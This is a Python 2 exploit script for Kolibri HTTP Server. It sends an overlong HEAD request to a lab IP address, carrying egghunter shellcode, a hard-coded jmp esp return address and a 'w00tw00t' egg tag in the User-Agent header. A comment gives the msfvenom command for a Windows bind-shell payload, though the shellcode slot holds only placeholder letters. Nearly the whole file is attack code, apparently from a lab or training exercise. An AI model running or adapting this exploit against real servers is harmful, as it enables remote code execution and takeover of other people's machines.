#!/usr/bin/python

import socket
import os
import sys

banner = """
#----------------------------------------------#
Kolibri HTTP Server Exploit - Egghunter
#----------------------------------------------#
"""

print banner

#Egghunter
#Size 32-bytes
#use mona -> !mona egg -t w00t -> "w00tw00t"
hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=192.168.37.131 LPORT=4444 -e x86/alpha_mixed -f c

#0x7c9d30d7 jmp esp from shell32.dll?
Stage1 = "A"*478 + hunter + "A"*5 + "\xd7\x30\x9d\x7c" + "\xEB\xC4"
#hunter + shellcode
Stage2 = "w00tw00t" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.37.131:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.37.131", 8080))
expl.send(buffer)

launchsploit = """
#----------------------------------------------#
Kolibri Exploit Launched
#----------------------------------------------#
"""

print launchsploit

expl.close()
